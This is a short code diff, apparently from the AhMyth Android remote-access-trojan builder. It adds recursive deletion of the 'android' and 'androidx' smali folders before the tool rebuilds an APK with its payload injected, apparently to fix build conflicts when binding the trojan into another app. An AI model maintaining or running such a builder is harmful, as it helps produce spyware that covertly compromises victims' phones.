@@ -294,6 +294,13 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
                             delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                             return;
                         }
+                        
+                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'android'), {
+                            recursive: true
+                        });
+                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'androidx'), {
+                            recursive: true
+                        });
 
                         $appCtrl.GenerateApk(apkFolder);
 
@@ -331,6 +338,13 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
                             delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                             return;
                         }
+                        
+                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'android'), {
+                            recursive: true
+                        });
+                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'androidx'), {
+                            recursive: true
+                        });
 
                         $appCtrl.GenerateApk(apkFolder);
 
